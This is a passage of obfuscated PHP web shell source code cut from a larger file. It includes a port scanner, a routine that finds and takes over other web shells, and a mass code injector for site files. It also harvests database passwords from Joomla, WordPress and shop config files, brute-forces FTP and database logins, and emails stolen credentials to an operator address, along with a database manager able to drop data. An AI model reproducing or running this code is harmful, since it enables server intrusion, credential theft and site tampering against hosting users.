z5x(array("act"=>"tools","d","bcsubmit"=>"1"),z10w(z5b().z7u(z5t(z9y("434")).z9c(z6u("bc_host",$bc_host,'4').":".z6u("bc_port",$bc_port,'1').":".z3m("bc_src",$selectb,'1',1).z8b(z9y("435"),'7'))).z5b(),"2")); echo z7f().z7y().z10q(); $ii=0; if(@is_dir($tempdir)){ if($dh=@opendir($tempdir)){ while(($file=@readdir($dh))!==false){ if(@preg_match('/^(bndprt|bckcon)\.?[a-zA-Z0-9]{32}/',$file)){ if(@isset($clean)){ @unlink($tempdir.$file); }else{ $ii++; } } } @closedir($dh); } } if($ii!=0) echo z3q(@strtoupper(z9y("269",$ii)).z5x(array("act"=>"tools","d","clean"=>"1"),z8b(z9y("270"),'7'))); } $pscmsg=''; $startscan=0; if(@isset($pscan)&&$pscan&&!@empty($pscip)&&@is_numeric($pscps)&&@is_numeric($pscpe)){ if($pscps<0||$pscps>65535||$pscpe<0||$pscpe>65535){ $pscmsg=z9y("280"); } else { $startscan=1; } } echo z3q(array(z9y("281"),z9y("277").($pscmsg!=''?" : ".$pscmsg:'')),"46"); if(!@isset($pscip)) $pscip=$saddr; if(!@isset($pscps)) $pscps="0"; if(!@isset($pscpe)) $pscpe="65535"; echo z9m(2). z7o(). z7j('','4').z6s(). z9m('2'). z7l().z9v("shellhunt","1").z9v("act","tools").z9v("d"). z7u(z5t(z9y("282")).z9c(z3m("shaction",array("view"=>z9y("284"),"viewall"=>z9y("285"),"own"=>z9y("286"),"ownall"=>z9y("287")),"5",1).":".z3m("shrecursive",$rec_arr,"1",1).z8b(z9y("436"),"7"))). z7u(z5t(z9y("283")).z9c(z5y("shpath",$d,"0"))). z9l(). z10q(). z6s(). z7f().z7j('','46'). z6s(). z9m('2'). z5x(array("act"=>"tools","d","pscan"=>"1"),z7u(z5t(z9y("278")).z9c(z6u("pscip",$pscip,"4").":".z6u("pscps",$pscps,'1')."-".z6u("pscpe",$pscpe,'1').z8b(z9y("279"),'7')))). z10q(). z6s(). z7f(). z7y(). z10q(); if(@isset($shellhunt)&&$shellhunt){ $fpaths=$tpaths=$spaths=$glob=$shells=array(); $tpath=''; $tpaths[]=''; if(@is_numeric($shrecursive)){ for($i=0;$i<$shrecursive;$i++){ $tpath.='*/'; $tpaths[]=$tpath; } } else { $tpaths[]='*/'; } foreach(@array_unique($tpaths) as $tpath){ $fpaths[]=$tpath."*.php"; } foreach(@array_unique($fpaths) as $fpath){ $spaths[]=z1k($shpath).$fpath; } unset($fpaths); unset($tpaths); foreach($spaths as $spath){ $tglob=@glob($spath); if(@is_array($tglob)&&@count($tglob)>0){ foreach($tglob as $tfile){ if(!@in_array($tfile,$glob)&&(@realpath($tfile)!=@realpath('index.php'))) $glob[]=$tfile; } $glob=@array_unique($glob); } } unset($spaths); if(@count($glob)>0){ $viewall=$rcown=0; switch($shaction){ case 'view': $viewall=$rcown=0; break; case 'viewall': $viewall=1; $rcown=0; break; case 'own': $viewall=0; $rcown=1; break; case 'ownall': $viewall=$rcown=1; break; default: $viewall=$rcown=0; break; } foreach($glob as $tmp){ if(($ttype=z2r($tmp,$viewall,$rcown))!==false){ $shells[$tmp]=$ttype; } } } if(@count($shells)>0){ if(($wwwdir=z3n())!==false){ $url=z8u(); $url_a=@parse_url($url); if(@isset($url_a["host"])){ $shellhost=$url_a["host"]; } } $external=1; echo z3q(z9y("288"),"1").z9m("2").z7u(z9c(z9y("292"),"13","2").z9c(z9y("293"),"13").z9c(z9y("294"),"13").z9c(z9y("295"),"13","3")); $tr=0; foreach($shells as $shell=>$shelltype){ $wwwlink="-"; if(@isset($shellhost)&&@strstr($shell,$wwwdir)!==false){ $wwwlink=z10t('http://'.$shellhost.'/'.@substr($shell, @strlen($wwwdir)).'"',z9y("296"),"1",1); } echo z7u(z9c(z2l($shell),"14","2").z9c($shelltype,"14").z9c($wwwlink,"14").z9c(z0o($shell,"1").z5x(array("act"=>"f","ft"=>"rcown","d"=>z3a($shell),"f"=>z2l($shell)),z8b(z9y("297"),"18"),"1"),"14","3"),($tr%2?'0':'1')); $tr++; } echo z10q(); } } if($startscan){ $pscan=z8j($pscip,$pscps,$pscpe); if(@!empty($pscan)){ echo z3q(z9y("289")); echo z6s().z10w(z7u(z6l(z5w('','1').$pscan.z5q())),'2').z6s(); } } echo z3q(array(z9y("298"),z9y("309")),"46"); echo z9m(2). z7o(). z7j('','4').z6s(). z9m('2'). z7l().z9v("cpfind","1").z9v("act","tools").z9v("d"). z7u(z5t(z9y("299")).z9c(z5y("cphost","127.0.0.1","5").":".z5y("cpuser","root","4").":".z3m("cpservice",$available_arr,"1",1))). z7u(z5t(z9y("300")).z9c(z5y("cpfiles","*conf*.php;*db*.php;","5").":".z3m("cpmethod",$arr_method,"4",1).":".z3m("cprecursive",$rec_arr,"1",1))). z7u(z5t(z9y("301")).z9c(z5y("cpdir",$d,"0"))). ($bmail?z7u(z5t(z9y("302")).z9c(z5y("cp_email","",'2').z9f("cp_log"))):''). z7u(z5t(z9x()). z9c(z8b(z9y("307"),"7").z9x().z5u("cppassfile",z9y("303"),"cppassfile"))). z9l(). z10q(). z6s(). z7f().z7j('','46'). z6s(). z9m('2'). z7l().z9v("inject","1").z9v("act","tools").z9v("d"). z7u(z5t(z9y("310")).z9c(z5y("injfiles","*.html;index.php;","5").":".z3m("injmethod",$inj_method,"4",1).":".z3m("injrecursive",$rec_arr,"1",1))). z7u(z5t(z9y("311")).z9c(z5y("injdir",$d,"0"))). z9d(z5t(z9y("312")).z9c(z5w("injcode","6").(@isset($injcode)?@htmlspecialchars($injcode):'').z5q())). z7u(z5t(z9x()). z9c(z8b(z9y("313"),"7"))). z9l(). z10q(). z6s(). z7f(). z7y(). z10q(); if(@isset($inject)&&$inject){ $fpaths=$tpaths=$spaths=$glob=array(); $farr=@explode(";",$injfiles); $tpath=''; $tpaths[]=''; if(@is_numeric($injrecursive)){ for($i=0;$i<$injrecursive;$i++){ $tpath.='*/'; $tpaths[]=$tpath; } } else { $tpaths[]='*/'; } foreach(@array_unique($tpaths) as $tpath){ foreach(@array_unique($farr) as $fpath){ $fpath=@trim($fpath); if(!@empty($fpath)){ $fpaths[]=$tpath.$fpath; } } } foreach(@array_unique($fpaths) as $fpath){ $spaths[]=z1k($injdir).$fpath; } unset($fpaths); unset($tpaths); foreach($spaths as $spath){ $tglob=@glob($spath); if(@count($tglob)>0){ foreach($tglob as $tfile){ if(!@in_array($tfile,$glob)) $glob[]=$tfile; } $glob=@array_unique($glob); } } unset($spaths); if(@count($glob)>0){ $i=0; foreach($glob as $file){ if(z3v($injcode,$injmethod,$file)){ if($i==0){ echo z3q(z9y("314")).z6s().z9m("2").z6f().z6q().z5w('','1'); z5o(); } echo $file."\r\n"; $i++; } } if($i>0) echo z5q().z7f().z7y().z10q().z6s(); } } if(@isset($cpfind)&&$cpfind&&(!@empty($cpuser)||$cpmethod=="cppasswd")){ echo z3q(z9y("308")).z6s(); echo z9m('2').z7o().z6q().z5w("","1"); z5o(); $fpaths=$tpaths=$spaths=$glob=array(); $farr=@explode(";",$cpfiles); $tpath=''; $tpaths[]=''; if(@is_numeric($cprecursive)){ for($i=0;$i<$cprecursive;$i++){ $tpath.='*/'; $tpaths[]=$tpath; } } else { $tpaths[]='*/'; } foreach(@array_unique($tpaths) as $tpath){ foreach(@array_unique($farr) as $fpath){ $fpath=@trim($fpath); if(!@empty($fpath)){ $fpaths[]=$tpath.$fpath; } } } switch($cpmethod){ case 'cpdir': $spaths[$cpuser]=array(); foreach(@array_unique($fpaths) as $fpath){ $spaths[$cpuser][]=z1k($cpdir).$fpath; } break; case 'cpdocroot': $spaths[$cpuser]=array(); foreach(@array_unique($fpaths) as $fpath){ $spaths[$cpuser][]=z1k($wwwdir).$fpath; } break; case 'cppasswd': $uarr=z8l(1); if(@count($uarr)>0){ foreach($uarr as $uk=>$arr){ if($arr[1]!='/'&&!@preg_match('#^(/var/run|/var/log|/var/cache|/var/mail|/var/cache|/var/backup|/usr/games|/lib|/var/lib|/var/tmp|/tmp|/dev|/proc|/sbin|/usr/sbin|/usr/local/sbin|/bin|/usr/bin|/usr/local/bin)#',$arr[1])&&z4j($arr[1])){ $spaths[$arr[0]]=array(); foreach(@array_unique($fpaths) as $fpath){ $spaths[$arr[0]][]=z1k($arr[1]).$fpath; } } } } unset($uarr); break; default: break; } unset($fpaths); unset($tpaths); foreach($spaths as $user=>$spath_arr){ foreach($spath_arr as $spath){ $tglob=@glob($spath); if(@is_array($tglob)&&@count($tglob)>0){ if(!@isset($glob[$user])) $glob[$user]=array(); foreach($tglob as $tfile){ if(!@in_array($tfile,$glob[$user])) $glob[$user][]=$tfile; } $glob[$user]=@array_unique($glob[$user]); } } } unset($spaths); if(@count($glob)>0){ foreach($glob as $user=>$file_arr){ if(@count($file_arr)>0){ foreach($file_arr as $tfile){ z2p($tfile,$user); } } } } $log=''; $found=0; if(@isset($passarray)&&@count($passarray)>0){ foreach($passarray as $user=>$passwords){ if(@count($passwords)>0){ foreach($passwords as $pass){ if(@isset($cppassfile)&&$cppassfile){ echo "$user $pass\r\n"; } else { if(!@isset($stop)) $stop=0; if($cpservice=="FTP"&&$bftp&&!$stop){ $test=z3l($cphost,$user,$pass,21,3); if($test=="failed"){ $stop=1; } elseif($test=="valid"){ $found++; $tmp = "host: $cphost\r\n"; $tmp .= "user: $user\r\n"; $tmp .= "pass: $pass\r\n"; $tmp .= "service: $cpservice\r\n\r\n"; echo $tmp; $log.=$tmp; } } else { if(z3h($cphost,$user,$pass,'',$cpservice)=="valid"){ $found++; $tmp = "host: $cphost\r\n"; $tmp .= "user: $user\r\n"; $tmp .= "pass: $pass\r\n"; $tmp .= "service: $cpservice\r\n\r\n"; echo $tmp; $log.=$tmp; } } } } } } } if($cp_log=="1"&&$found>0&&$bmail){ @mail($cp_email,"$cpservice|$cphost",$log); } echo z5q().z7y().z7f().z10q().z6s(); } $arr_cfgs=array(''=>"Select Software","joomla"=>"Joomla","opencart"=>"Opencart","osc"=>"Oscommerce","pinnaclecart"=>"Pinnaclecart","squirrelcart"=>"Squirrelcart","wordpress"=>"Wordpress","xcart"=>"X-cart","zencart"=>"Zen-cart","all"=>"All of above"); if(@isset($sqlfind)&&$sqlfind&&@isset($dvdefined)&&!@empty($dvdefined)&&@isset($dvpasswd)&&!@empty($dvpasswd)){ $dvcfgs="nVrkA0mFRDYCHunZ3cN9mLz5pNShsm0r8L4drmb0FTMSPnfIqA4j+Uq6gfLYuldrtsMMNTgK5UoZ3ViSZ5jne7teFyngMstdNqjRBr1NSDZgOnhkT05Hm25ikOaooEva9Wc965VdcbUYpnqs8xq5VDaKeBpRkS1VAxaLTKOr899pfM1pm/v7Rdctk4H0A4bXSxn5Lup5HAdjjl1EzocQXar6WsYumziDYD/EOBgmBiNVl/+kGwfPs64vQfzVuttfcY7tizzenPmMJgE8BGj2AZuXWtxnl3UO4CAPBOdtwkrv+PwMsYhffkEyh17eC3BufrqDkWAQhECUhs8dnp1R0g5/ByuJMebTOe9qwpDDh5goXgYhtjTthSEu4XShBdKNHg+ve/4/QhiJb0hSq8ezOZHCmW1PZ/0gyrywZx2aucGJeCZx3mxnfjiKAGHcnJaiFDV09dXZRuvfGe6SGiPq84bErZThDHORRs5Fz8NivUxj9m+WW7QRtak8EOUiIcTlbPIP85XIWob21V3v83fAAOAr9oJUJJ8gpdfqOLIyJyfa5Kvas2O1DHnvqoS6GsEGGrfnlXHoTeiw47nGeR4SoC7BFPu0hM3hnC4QPR8jrI7D5xYYO3wzK4uhJU4f5Ot8GuqNTsjE1LTyuBqJbeY4I5tcmQLsFYmqyGEQXP4NDExH7OlBMKSlpVkMEeLtouWDMdeAhiYiyWM20jy2VJi5xiQevlBfG/briKFxmCwNdmF2JexxL6qlRGn+Rdx9VYGFot2rxR7y2JTeViten/QNci1L4xAWoHaT1EMCd0zxP/ZYRcBgvzt4326NG1WBspNY6SeSnbBQvPoMcrnOjXHrARy1NyzAUHGhtWeBoFAlShuSA2c4cqGEQTrs1PPKxpTbBacuNLMmm+wvMNvBhdt2HTfZTjdYyEn0qEfOVPTWb8LWPKWxA/zIJ5OYeVH69g0b4CPNknHes4yNY6D7RxK905EY0DMMI1h8HY1n7r7ZvWd84O3VBf904vQUILRA/vhyRb7oKUHttyCruZoG4lgAQGg78PHaYugtc9SFu7Pq41Cn"; $ddcfgs=zrc4::zdec(@md5($dvpasswd), @base64_decode($dvcfgs)); if($dvdefined=="all"){ $arr_mass=array(); $arr_mass_paths=array(); foreach($arr_cfgs as $tcfg=>$tsoft){ if($tcfg!=''&&$tcfg!="all"){ $tddcfg=@explode("|".$tcfg."|",$ddcfgs); $tddcfg=@substr($tddcfg[1],0,@strpos($tddcfg[1],"|")); @list($tdvuser,$tdtuser,$tdvpass,$tdtpass,$tdvbase,$tdtbase,$tdvhost,$tdthost,$tdvfiles,)=@explode(",",$tddcfg); $arr_mass[$tsoft]=array($tdvuser,$tdtuser,$tdvpass,$tdtpass,$tdvbase,$tdtbase,$tdvhost,$tdthost); $tefiles=@explode(";",$tdvfiles); foreach($tefiles as $tefile){ $tefile=@trim($tefile); if(!@empty($tefile)&&!@in_array($tefile,$arr_mass_paths)) $arr_mass_paths[]=$tefile; } } } } else { if(@strpos($ddcfgs,"|".$dvdefined."|")!==false){ $ddcfg=@explode("|".$dvdefined."|",$ddcfgs); $ddcfg=@substr($ddcfg[1],0,@strpos($ddcfg[1],"|")); @list($dvuser,$dtuser,$dvpass,$dtpass,$dvbase,$dtbase,$dvhost,$dthost,$dvfiles,)=@explode(",",$ddcfg); } } } echo z3q(array(z9y("315"),z9y("337")),'46'); echo z9m(2). z7o(). z7j('','4'). z6s(). z9m('2'). z7l().z9v("sqlfind","1").z9v("act","tools").z9v("d"). z7u(z5t(z9y("316")).z9c(z5y("dvuser","","5").":".z3m("dtuser",$arr_vars,"4",1).z9x().z9y("328"))). z7u(z5t(z9y("317")).z9c(z5y("dvpass","","5").":".z3m("dtpass",$arr_vars,"4",1).z9x().z9y("328"))). z7u(z5t(z9y("318")).z9c(z5y("dvbase","","5").":".z3m("dtbase",$arr_vars,"4",1).z9x().z9y("329"))). z7u(z5t(z9y("319")).z9c(z5y("dvhost","","5").":".z3m("dthost",$arr_vars,"4",1).z9x().z9y("329"))). z7u(z5t(z9y("320")).z9c(z3m("dvdefined",$arr_cfgs,"5",1).":".z5y("dvpasswd","","4").z9x()."anti-lamerz :)")). z7u(z5t(z9y("321")).z9c(z5y("dvfiles","","5").":".z3m("dvfind",$arr_dvfind,"4",1).":".z3m("dtrecursive",$rec_arr,"1",1))). z7u(z5t(z9y("322")).z9c(z5y("dvdir",$d,"0"))). ($bmail?z7u(z5t(z9y("302")).z9c(z5y("dv_email","",'2').z9f("dv_log"))):''). z7u(z5t(z9x()). z9c(z8b(z9y("323"),"7").z9x().z5u("dvsqltest",z9y("324"),"dvsqltest"))). z9l(). z10q(). z6s(). z7f().z7j('','46'). z6s(). z9m('2'). z7l().z9v("startbrute","1").z9v("act","tools").z9v("d"). z7u(z5t(z9y("338")).z9c(z5y("brh","","4").":".z5y("brp","","6").":".z3m("bservice",$available_arr,"4",1))). z7u(z5t(z9y("339")). z9c(z5y("bru","",'4').":".z5y("brdb","",'5'))). z7u(z5t(z9y("340")). z9c(z9g("wordlist",'2'))). z7u(z5t(z9y("341")). z9c(z3m("brm",$brute_type,'2',1))). z7u(z5t(z9y("342")). z9c(z5u("brtest1","user:resu","brtest1").z9x(1).z5u("brtest2","user:user1","brtest2").z9x(1).z5u("brtest3","user:user123","brtest3"))). z7u(z5t(z9x()).z9c(z5u("brtest4","Transform password to p@55w0rd","brtest4"))). ($bmail?z7u(z5t(z9y("302")).z9c(z6u("brute_email",$brute_email,'2').z9f("brute_log"))):''). z7u(z5t(z9x()). z9c(z8b(z9y("346"),"7"))). z9l(). z10q(). z6s(). z7f(). z7y(). z10q(); if(@isset($startbrute)&&$startbrute){ $stop=0; echo z3q(z9y("347",$bservice,1)).z6s(); echo z9m('2').z7o().z6q().z5w("","1"); z5o(); $con=true; $show=0; $log=""; if($bservice=="FTP"){ $brp=(@preg_match("/^[0-9]{1,5}$/",$brp)?$brp:"21"); }elseif($bservice=="MySQL"){ $brp=(@preg_match("/^[0-9]{1,5}$/",$brp)?$brp:"3306"); } if($brm=="1"||$brm=="3"){ $dictionary=array(); $list=@fopen($_FILES['wordlist']['tmp_name'],'r'); if(@is_resource($list)){ while(!@feof($list)){ $dictionary[]=@trim(@fgets($list)); } @fclose($list); } $dictionary=@array_unique($dictionary); } if($bservice=="FTP"&&$bftp){ $time=3; $success=0; $count=0; if(!@empty($bru)&&!$stop){ $test=z2f($brh,$brp,$time,$brtest1,$brtest2,$brtest3,$brtest4,$bru); if(!$test) $stop=1; z2g($test[0],$test[1],$test[2]); } if(($brm=="2"||$brm=="3")&&!$stop){ foreach($users as $user){ $test=z2f($brh,$brp,$time,$brtest1,$brtest2,$brtest3,$brtest4,$user); if(!$test){ $stop=1; break; } z2g($test[0],$test[1],$test[2]); if($brm=="3"){ foreach($dictionary as $passwd){ $test=z2f($brh,$brp,$time,$brtest1,$brtest2,$brtest3,$brtest4,$user,$passwd); z2g($test[0],$test[1],$test[2]); } } } }else if($brm=="1"&&!@empty($bru)&&!$stop){ foreach($dictionary as $passwd){ $test=z2f($brh,$brp,$time,$brtest1,$brtest2,$brtest3,$brtest4,$bru,$passwd); if(!$test){ $stop=1; break; } z2g($test[0],$test[1],$test[2]); } } echo "\r\n--------------------\r\n"; echo z9y("426",$count)."\r\n"; echo z9y("427",$success)."\r\n"; }elseif($bmysql||$bmssql||$boracle||$bpostgres){ $success=0; $count=0; if(!@empty($bru)){ $test=z2s($brh,$brp,$bservice,$brtest1,$brtest2,$brtest3,$brtest4,$bru,NULL,(!@empty($brdb)?$brdb:'')); z2g($test[0],$test[1],$test[2]); } if($brm=="2"||$brm=="3"){ foreach($users as $user){ $test=z2s($brh,$brp,$bservice,$brtest1,$brtest2,$brtest3,$brtest4,$user,NULL,(!@empty($brdb)?$brdb:'')); z2g($test[0],$test[1],$test[2]); if($brm=="3"){ foreach($dictionary as $passwd){ $test=z2s($brh,$brp,$bservice,$brtest1,$brtest2,$brtest3,$brtest4,$user,$passwd,(!@empty($brdb)?$brdb:'')); z2g($test[0],$test[1],$test[2]); } } } }else if($brm=="1"&&!@empty($bru)){ foreach($dictionary as $passwd){ $test=z2s($brh,$brp,$bservice,$brtest1,$brtest2,$brtest3,$brtest4,$bru,$passwd,(!@empty($brdb)?$brdb:'')); z2g($test[0],$test[1],$test[2]); } } echo "\r\n--------------------\r\n"; echo z9y("426",$count)."\r\n"; echo z9y("427",$success)."\r\n"; echo $log; } if($brute_log=="1"&&$success>0){ @mail($brute_email,"$bservice|$brh:$brp",$log); } echo z5q().z7y().z7f().z10q().z6s(); } if(@isset($sqlfind)&&$sqlfind&&!@empty($dvuser)&&!@empty($dvpass)){ echo z3q(z9y("330")).z6s(); echo z9m('2').z7o().z6q().z5w("","1"); z5o(); $fpaths=$tpaths=$dpaths=$spaths=$glob=array(); $farr=@explode(";",$dvfiles); $tpath=''; $tpaths[]=''; if(@is_numeric($dtrecursive)){ for($i=0;$i<$dtrecursive;$i++){ $tpath.='*/'; $tpaths[]=$tpath; } } else { $tpaths[]='*/'; } if($dvdefined=="all"&&@isset($arr_mass_paths)&&@is_array($arr_mass_paths)&&@count($arr_mass_paths)>0){ $farr=$arr_mass_paths; } foreach(@array_unique($tpaths) as $tpath){ foreach(@array_unique($farr) as $fpath){ $fpath=@trim($fpath); if(!@empty($fpath)){ $fpaths[]=$tpath.$fpath; } } } switch($dvfind){ case 'dvdir': $dpaths[]=z1k($dvdir); break; case 'docroot': $dpaths[]=z1k($wwwdir); break; case 'passwd': $uarr=z8l(1); if(@count($uarr)>0){ foreach($uarr as $uk=>$arr){ if(!@in_array($arr[1],$dpaths)&&$arr[1]!='/'&&!@preg_match('#^(/var/run|/var/log|/var/cache|/var/mail|/var/cache|/var/backup|/usr/games|/lib|/var/lib|/var/tmp|/tmp|/dev|/proc|/sbin|/usr/sbin|/usr/local/sbin|/bin|/usr/bin|/usr/local/bin)#',$arr[1])&&z4j($arr[1])) $dpaths[]=z1k($arr[1]); } } unset($uarr); break; default: break; } foreach(@array_unique($dpaths) as $dpath){ foreach(@array_unique($fpaths) as $fpath){ $spaths[]=$dpath.$fpath; } } unset($fpaths); unset($tpaths); unset($dpaths); foreach($spaths as $spath){ $tglob=@glob($spath); if(@is_array($tglob)&&@count($tglob)>0){ foreach($tglob as $tfile){ if(!@in_array($tfile,$glob)) $glob[]=$tfile; } } } $glob=@array_unique($glob); unset($spaths); if(@count($glob)>0){ $log=''; $line=@str_repeat("-",100)."\r\n"; $final_arr=array(); foreach($glob as $file){ $tct=z9o($file); if(!@empty($tct)){ if($dvdefined=="all"&&@isset($arr_mass)&&@is_array($arr_mass)&&@count($arr_mass)>0){ foreach($arr_mass as $software=>$defines){ $base=""; $user=z4b($defines[1],$defines[0],$tct); $pass=z4b($defines[3],$defines[2],$tct); if(!@empty($defines[4])){ $base=z4b($defines[5],$defines[4],$tct); } if(!@empty($defines[6])){ $host=z4b($defines[7],$defines[6],$tct); } if(!@isset($host)||@empty($host)) $host="localhost"; if(!@empty($host)&&!@empty($user)&&!@empty($pass)){ $add=0; if(@isset($dvsqltest)&&$dvsqltest){ if(z3h($host,$user,$pass,"3306","MySQL")=="valid") $add=1; } else { $add=1; } if($add){ $tmp = $line; $tmp .= "$file\r\n"; $tmp .= "Software tested: $software\r\n"; $tmp .= $line; $tmp .= "host: $host\r\n"; $tmp .= "user: $user\r\n"; $tmp .= "pass: $pass\r\n"; $tmp .= "database: $base\r\n\r\n"; echo $tmp; $log.=$tmp; if(!@isset($final_arr[$file])) $final_arr[$file]=array($host,$user,$pass,$base,$software); break; } } } } else { $base=""; $user=z4b($dtuser,$dvuser,$tct); $pass=z4b($dtpass,$dvpass,$tct); if(!@empty($dvbase)){ $base=z4b($dtbase,$dvbase,$tct); } if(!@empty($dvhost)){ $host=z4b($dthost,$dvhost,$tct); } if(!@isset($host)||@empty($host)) $host="localhost"; if(!@empty($host)&&!@empty($user)&&!@empty($pass)){ $add=0; if(@isset($dvsqltest)&&$dvsqltest){ if(z3h($host,$user,$pass,"3306","MySQL")=="valid") $add=1; } else { $add=1; } if($add){ $tmp = $line; $tmp .= "$file\r\n"; $tmp .= $line; $tmp .= "host: $host\r\n"; $tmp .= "user: $user\r\n"; $tmp .= "pass: $pass\r\n"; $tmp .= "database: $base\r\n\r\n"; echo $tmp; $log.=$tmp; if(!@isset($final_arr[$file])) $final_arr[$file]=array($host,$user,$pass,$base); } } } } unset($tct); } } echo z5q().z7y().z7f().z10q().z6s(); if($dv_log=="1"&&$log!=''){ @mail($dv_email,"DBS|$saddr",$log); } } if(@isset($final_arr)&&@count($final_arr)>0){ echo z9m("2").z7u(z9c(z9y("331"),"13","2").z9c(z9y("332"),"13").z9c(z9y("333"),"13").z9c(z9y("334"),"13").z9c(z9y("335"),"13","3")); $tr=0; foreach($final_arr as $file=>$array){ echo z6f(($tr%2?'0':'1')); $tc=@count($array); $dsoft=''; if($tc==5){ $tc=4; $dsoft=$array[$tc]; } for($i=0;$i<$tc;$i++){ echo z9c($array[$i],"14",($i==0?"2":"")); } echo z9c(z5x(array("act"=>"sql","d","sql_refresh"=>"1","sql_server"=>$array[0],"sql_user"=>$array[1],"sql_pass"=>$array[2],"sql_db"=>$array[3],"sql_port"=>"3306","sql_engine"=>"MySQL"),z8b(z9y("336"),"7").(($dsoft!='')?" (".$dsoft.")":''),1),"14","3"); echo z7y(); $tr++; } } } if($act=='sql'){ $hideconnect=0; $hmsg=''; if(@isset($sql_act)&&$sql_act=="logoff"){ z0i('sql_server'); z0i('sql_user'); z0i('sql_pass'); z0i('sql_port'); z0i('sql_engine'); z0i('sql_session'); z0i('sql_sort'); } $sql_session=0; if(@isset($_SESSION['sql_session'])){ if(!@isset($sql_refresh)||!$sql_refresh){ $sql_server=$_SESSION['sql_server']; $sql_user=$_SESSION['sql_user']; $sql_pass=$_SESSION['sql_pass']; $sql_port=$_SESSION['sql_port']; $sql_engine=$_SESSION['sql_engine']; if(!@isset($sql_sort)) $sql_sort=$_SESSION['sql_sort']; $sql_session=1; } else { z0i('sql_server'); z0i('sql_user'); z0i('sql_pass'); z0i('sql_port'); z0i('sql_engine'); z0i('sql_session'); z0i('sql_sort'); } } if(!@empty($sql_server)&&!@empty($sql_port)&&!@empty($sql_user)&&@isset($sql_pass)&&!@empty($sql_engine)){ if(!@isset($sql_db)) $sql_db=''; $sql=new my_sql(); $sql->db=$sql_engine; $sql->host=$sql_server; $sql->port=$sql_port; $sql->user=$sql_user; $sql->pass=$sql_pass; $sql->base=$sql_db; if($sql->connect()){ $hideconnect=1; if(!@isset($sql_sort)) $sql_sort="0a"; $_SESSION['sql_server']=$sql_server; $_SESSION['sql_user']=$sql_user; $_SESSION['sql_pass']=$sql_pass; $_SESSION['sql_port']=$sql_port; $_SESSION['sql_engine']=$sql_engine; $_SESSION['sql_session']=1; $_SESSION['sql_sort']=$sql_sort; $hideconnect=1; $db_actions=array("select"=>"Select","dump"=>"Dump","drop"=>"Drop"); $table_actions=array("browse"=>"Browse","dump"=>"Dump","drop"=>"Drop","empty"=>"Empty","insert"=>"Insert"); echo z3q(z9m('2').z7u(z6l( z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine"),z8b(z9y("352"),(!@isset($sql_act)||!@in_array($sql_act,array("query","emails","serverstatus","servervars","processes"))?"12":"14"))). z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"query","sql_db"),z8b(z9y("353"),(@isset($sql_act)&&$sql_act=="query"?"12":"14"))). z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"emails","sql_db"),z8b(z9y("354"),(@isset($sql_act)&&$sql_act=="emails"?"12":"14"))). z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"serverstatus"),z8b(z9y("355"),(@isset($sql_act)&&$sql_act=="serverstatus"?"12":"14"))). z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"servervars"),z8b(z9y("356"),(@isset($sql_act)&&$sql_act=="servervars"?"12":"14"))). z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"processes"),z8b(z9y("357"),(@isset($sql_act)&&$sql_act=="processes"?"12":"14"))). z5x(array("act"=>"sql","d","sql_act"=>"logoff"),z8b(z9y("358"),"14")) ,"")).z10q()); if($sql_engine=="MySQL"){ if(!@isset($sql_act)){ if(@isset($sql_db)&&!@empty($sql_db)){ $sql->base=$sql_db; if($sql->select_db()){ $sql_act="db_act"; $db_act="select"; } else { $sql_act="showdb"; $sql_db=""; $sql->base=""; } } else { $sql_act="showdb"; } } $dbs=$sql->list_dbs(); $db_list=array(''=>z9y("367",@count($dbs))); foreach($dbs as $k=>$v) $db_list[$k]=$v; if($sql_act=="db_act"&&@isset($db_act)&&!@empty($sql_db)){ switch($db_act){ case 'dump': $sql_act="dump"; break; case 'drop': if(@isset($drop_confirm)&&$drop_confirm){ $sql->query('DROP DATABASE '.$sql_db.';'); $sql_act="showdb"; $sql_db=""; } else { $sql_act="dropdb"; } break; } } elseif($sql_act=="table_act"&&@isset($table_act)&&!@empty($sel_table)){ switch($table_act){ case 'dump': $sql_act="dump"; break; case 'drop': if(@isset($drop_confirm)&&$drop_confirm){ $sql->base=$sql_db; if($sql->select_db()){ $sql->query('DROP TABLE '.$sel_table.';'); } $sel_table=""; $sql_act="db_act"; $db_act="select"; } else { $sql_act="droptable"; } break; case 'empty': if(@isset($empty_confirm)&&$empty_confirm){ $sql->base=$sql_db; if($sql->select_db()){ $sql->query('DELETE FROM '.$sel_table.';'); } $sql_act="table_act"; $table_act="browse"; } else { $sql_act="empty"; } break; case 'insert': break; case 'delete': $sql->base=$sql_db; if($sql->select_db()){ $sql->query('DELETE FROM '.$sel_table.' WHERE '.$sql_tbl_insert_q.' LIMIT 1;'); } $table_act="browse"; break; } } if(!@in_array($sql_act,array("showdb","query","serverstatus","servervars","processes","emails"))){ $db_submit_acts=$table_submit_acts=''; foreach($db_actions as $dk=>$dv) $db_submit_acts .= z6o($dk,$dv,"7"); foreach($table_actions as $tk=>$tv) $table_submit_acts .= z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act","table_act"=>$tk,"sql_db","sel_table"),z6o($tk,$tv,"7")); $table_submit_acts=z10w(z7u(z9c($table_submit_acts)),"2"); $db_table=z10w(z7u(z6l(z7n(z9y("364")).z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"db_act"),z3m("sql_db",$db_list,"0",1).z3m("db_act",$db_actions,"1").z8b(z9y("92"),"7")))),"2"); if(@isset($sql_db)&&!@empty($sql_db)){ $sql->base=$sql_db; if($sql->select_db()){ $table_list=array(''=>"-"); $sql->query('SHOW TABLES FROM '.$sql_db.';'); if($sql->get_result()){ for($i=0;$i<$sql->num_rows;$i++){ foreach($sql->rows[$i] as $rk=>$rv){ $table_list[$rv]=$rv." (".$sql->count_rows($rv).")"; } } } $table_table=z10w(z7u(z6l(z7n(z9y("365")).z5x(array("act"=>"sql","d","sql_server","sql_user","sql_pass","sql_port","sql_engine","sql_act"=>"table_act","sql_db"),z3m("sel_table",$table_list,"0",1).z3m("table_act",$table_actions,"1").z8b(z9y("92"),"7")))),"2"); } } echo 